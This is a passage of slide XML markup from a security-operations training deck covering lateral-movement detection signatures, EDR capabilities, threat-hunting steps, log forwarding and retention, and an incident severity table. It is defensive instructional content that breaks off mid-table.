                        </a:rPr>
                        <a:t>WMI over DCOM (port 135)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event 4688 / Sysmon ID 1 on remote host</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1021.006</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303308">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PsExec</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Named pipe </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>PSEXESVC</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>System Event 7045: new service PSEXESVC</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1569.002</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>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Endpoint Detection &amp; Response (EDR)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Endpoint Detection and Response (EDR)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> platforms combine continuous endpoint telemetry collection, behavioral analysis, threat intelligence correlation, and automated response capabilities into a single agent-based solution.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Endpoint Detection &amp; Response (EDR) (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_edr_capabilities_comparison.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2278513" y="1330000"/>
            <a:ext cx="6559440" cy="4689999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="605999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EDR capability comparison: all four platforms provide behavioral detection and response automation, differing primarily in deployment model, AI/ML maturity, and integration ecosystem.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Endpoint Detection &amp; Response (EDR) (3/3)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EDR Capabilities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Continuous Recording:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Full endpoint telemetry stored for historical forensic query (typically 7-30 days).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Behavioral Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ML models identify anomalous process and network behavior without signatures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ATT&amp;CK Mapping:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Alerts automatically tagged with MITRE technique IDs for analyst context.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat Hunting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Query interface for proactive investigation across all endpoints simultaneously.</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Response Actions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Process Termination:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Kill a malicious process on a remote endpoint from the SOC console.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network Isolation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Block all network traffic from a compromised host except the EDR management channel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>File Quarantine:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Automatically or manually quarantine suspicious files.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Live Response:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Interactive shell session into a remote endpoint for real-time investigation.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Hunting Methodology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Threat hunting</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is the proactive, hypothesis-driven search for adversary activity that has evaded existing detection controls. It is the highest-maturity detection capability, sitting above automated alerting in the SOC maturity model.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Hunting Methodology (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_threat_hunting_methodology.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 hunting cycle: hypothesis-driven investigation converts intelligence about adversary behavior into active search operations across enterprise telemetry.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Hunting Methodology (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="16957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Formulate Hypothesis:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Based on a current threat intelligence report or ATT&amp;CK technique gap, define what attacker behavior you expect to find if the technique is present.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Define Data Sources:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Identify which log sources contain the telemetry needed to validate or refute the hypothesis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Query &amp; Analyze:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Write SIEM queries or EDR searches to surface all instances of the suspected behavior across the enterprise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Investigate Anomalies:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Manually review results to separate legitimate activity from suspicious patterns requiring deeper analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Document Outcome:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> If compromise found, escalate to incident response. If no compromise found, document the hunt as evidence of coverage and refine detection rules to automate future detection.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Device Attack Detection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professionals frequently operate under misconceptions about detection capabilities and attacker behavior. Correcting these misconceptions is essential for building effective, realistic detection programs.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Device Attack Detection (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_detection_misconceptions.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3733956"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="510395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Detection misconceptions debunked: six common beliefs that undermine security program effectiveness, with evidence-based corrections for each.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Device Attack Detection (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="5192677" cy="49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Myth 1, "Antivirus will catch everything"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth 2, "Blocking IPs and hashes is enough"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth 3, "More alerts = better security"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="1330000"/>
            <a:ext cx="5192677" cy="49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Myth 4, "Rebooting an infected system removes malware"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth 5, "Encrypted traffic is safe from analysis"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth 6, "Logs are only useful after a breach"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Forwarding &amp; Centralization Architecture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Collecting logs on individual endpoints is insufficient, logs must be </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>forwarded</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to a centralized, tamper-resistant storage system to support correlation, long-term retention, and forensic investigation.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Forwarding &amp; Centralization Architecture (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_log_forwarding_architecture.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Three-tier log architecture: endpoint generation, aggregator normalization, and centralized immutable storage with differentiated retention policies.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Forwarding &amp; Centralization Architecture (3/3)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Log Forwarding Technologies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Windows Event Forwarding (WEF):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Native Windows feature; subscribes to event channels on remote hosts and forwards over HTTPS using WS-Management protocol.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Syslog (RFC 5424):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Standard protocol for Linux/Unix and network device log forwarding; supports UDP, TCP, and TLS transport.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Splunk Universal Forwarder:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Lightweight agent that forwards raw log data to Splunk indexers; supports compression and TLS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Elastic Beats:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Lightweight data shippers for the Elastic Stack; Winlogbeat specifically targets Windows Event Logs.</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Retention Architecture</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Hot Tier (0-30 days):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Fast SSD storage for active investigation and real-time SIEM queries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Warm Tier (30-90 days):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Lower-cost storage for recent forensic investigations; slightly higher query latency.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cold Tier (90 days-7 years):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Immutable archive storage (WORM) for compliance and legal holds.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Log Integrity:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> HMAC signing of log batches to detect tampering; blockchain-based log notarization for high-assurance environments.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Severity Classification Framework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Not all security events require the same response. A </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>severity classification framework</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> enables consistent, documented prioritization of security incidents, ensuring the highest-risk events receive immediate escalation while lower-priority events are queued efficiently.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Severity Classification Framework (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_severity_classification.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="747977" y="1330000"/>
            <a:ext cx="96205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Five-level incident severity classification: a consistent taxonomy enables the SOC to allocate analyst resources proportionally to incident risk and business impact.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Severity Classification Framework (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="1330000"/>
          <a:ext cx="10555354" cy="2894359"/>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482393">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Severity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Classification</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Example Incident</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Target Response Time</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Escalation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="482393">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SEV-1 (Critical)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Active breach with confirmed data exfiltration or ransomware deployment</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Confirmed ransomware on multiple systems; DCSync detected</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>15 minutes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
